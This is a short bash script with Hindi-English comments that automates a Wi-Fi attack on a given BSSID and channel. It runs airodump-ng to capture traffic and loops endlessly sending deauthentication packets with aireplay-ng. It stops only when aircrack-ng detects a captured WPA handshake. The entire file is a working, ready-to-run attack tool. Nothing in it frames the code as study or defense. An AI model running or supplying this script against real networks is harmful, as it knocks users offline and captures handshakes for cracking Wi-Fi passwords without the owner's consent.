#!/bin/bash
# Ye script tab tak chalegi jab tak handshake na mil jaye ya user stop na kare

INTERFACE=$1
BSSID=$2
CHANNEL=$3
CAP_FILE="/tmp/awb_attack"

# Safai
pkill airodump-ng
pkill aireplay-ng
sleep 2
rm -f ${CAP_FILE}-01.*

# airodump-ng start karo
airodump-ng -c $CHANNEL --bssid $BSSID -w $CAP_FILE --ignore-negative-one $INTERFACE > /dev/null 2>&1 &
AIRODUMP_PID=$!
sleep 4

# Infinite Loop
while true; do
    # 30 Deauth packets bhejo
    aireplay-ng -0 30 -a $BSSID --ignore-negative-one $INTERFACE > /dev/null 2>&1
    
    # 10 seconds wait karo
    sleep 10
    
    # Check karo handshake mila ya nahi
    RESULT=$(aircrack-ng ${CAP_FILE}-01.cap 2>/dev/null)
    if echo "$RESULT" | grep -q "1 handshake"; then
        kill $AIRODUMP_PID
        echo "SUCCESS"
        exit 0
    fi
    # Agar nahi mila, toh loop dobara chalega (Infinite)
done